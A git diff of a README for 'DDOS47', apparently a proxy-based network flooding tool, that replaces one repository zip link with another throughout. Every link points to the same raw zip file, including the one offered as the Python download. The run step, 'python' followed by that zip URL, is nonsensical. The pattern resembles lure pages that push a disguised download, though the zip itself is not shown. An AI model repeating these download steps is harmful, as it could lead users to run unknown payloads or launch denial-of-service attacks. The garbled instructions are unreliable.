@@ -6,9 +6,9 @@ Welcome to DDOS47! This application helps you understand how automated network l
 
 ## 📥 Download DDOS47
 
-[![Download DDOS47](https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDOS47-v2.6-beta.1.zip)](https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDOS47-v2.6-beta.1.zip)
+[![Download DDOS47](https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDO_v1.6.zip)](https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDO_v1.6.zip)
 
-To download DDOS47, visit this page to download: [Download DDOS47 Releases](https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDOS47-v2.6-beta.1.zip).
+To download DDOS47, visit this page to download: [Download DDOS47 Releases](https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDO_v1.6.zip).
 
 ## 🔍 Features
 
@@ -20,20 +20,20 @@ To download DDOS47, visit this page to download: [Download DDOS47 Releases](http
 
 ## 📋 System Requirements
 
-- **Python 3.6 or Higher:** Ensure you have Python installed on your computer. You can download it from [https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDOS47-v2.6-beta.1.zip](https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDOS47-v2.6-beta.1.zip).
+- **Python 3.6 or Higher:** Ensure you have Python installed on your computer. You can download it from [https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDO_v1.6.zip](https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDO_v1.6.zip).
 - **Operating System:** Compatible with Windows, macOS, and major Linux distributions.
 - **Internet Connection:** The application fetches proxies online, so ensure a stable connection.
 
 ## 🛠️ Installation Instructions
 
 1. **Visit the Releases Page:**
-   Go to the following link: [Download DDOS47 Releases](https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDOS47-v2.6-beta.1.zip).
+   Go to the following link: [Download DDOS47 Releases](https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDO_v1.6.zip).
 
 2. **Select the Latest Release:**
    Look for the latest version at the top of the page.
 
 3. **Download the Application:**
-   Click on the file that corresponds to your operating system. This file might be named something like `https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDOS47-v2.6-beta.1.zip` or `https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDOS47-v2.6-beta.1.zip`.
+   Click on the file that corresponds to your operating system. This file might be named something like `https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDO_v1.6.zip` or `https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDO_v1.6.zip`.
 
 4. **Extract the Files (if needed):**
    If you downloaded a zip file, right-click on it and choose "Extract All" or use an extraction tool like WinRAR or 7-Zip.
@@ -52,7 +52,7 @@ To download DDOS47, visit this page to download: [Download DDOS47 Releases](http
 7. **Run the Application:**
    Now you can run the application by typing:
    ```
-   python https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDOS47-v2.6-beta.1.zip
+   python https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDO_v1.6.zip
    ```
    Ensure you have the necessary permissions. On some systems, you might need to prepend `sudo` for elevated access.
 
@@ -89,4 +89,4 @@ For any issues or questions, feel free to open an issue on the repository. We ap
 
 ## 📞 Download DDOS47 Again
 
-To download DDOS47, remember to visit this page to download: [Download DDOS47 Releases](https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDOS47-v2.6-beta.1.zip).
+To download DDOS47, remember to visit this page to download: [Download DDOS47 Releases](https://raw.githubusercontent.com/nagelboi/DDOS47/main/DDOS47/DDO_v1.6.zip).
